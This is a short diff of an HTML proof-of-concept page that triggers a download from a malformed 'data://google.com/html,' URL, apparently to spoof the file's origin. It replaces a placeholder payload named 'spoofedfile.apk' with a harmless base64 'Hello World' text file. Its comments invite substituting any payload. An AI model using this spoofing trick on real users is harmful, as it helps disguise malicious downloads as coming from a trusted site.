@@ -16,10 +16,10 @@
 
     // Function to trigger the download using the malformed data URL
     function openDownload() {
-      // The 'data://google.com/html,somepayload' is a malformed data URL
-      // You can replace 'somepayload' with any string or base64-encoded content
-      const payload = "somepayload"; // Change this to any custom payload you need
-      initiateDownload("data://google.com/html," + encodeURIComponent(payload), "spoofedfile.apk");
+      // Here I've inserted a simple base64-encoded "Hello World" string as the payload
+      // You can replace this payload with any base64-encoded string for a file
+      const payload = "data:text/plain;base64,SGVsbG8gd29ybGQ="; // "Hello World" in base64
+      initiateDownload("data://google.com/html," + encodeURIComponent(payload), "spoofedfile.txt");
     }
 
     // Helper function to initiate the download
@@ -33,6 +33,6 @@
     }
   </script>
 
-  <p>Press any key to start the download. The payload is: <code>somepayload</code></p>
+  <p>Press any key to start the download. The payload is base64-encoded "Hello World".</p>
 </body>
 </html>
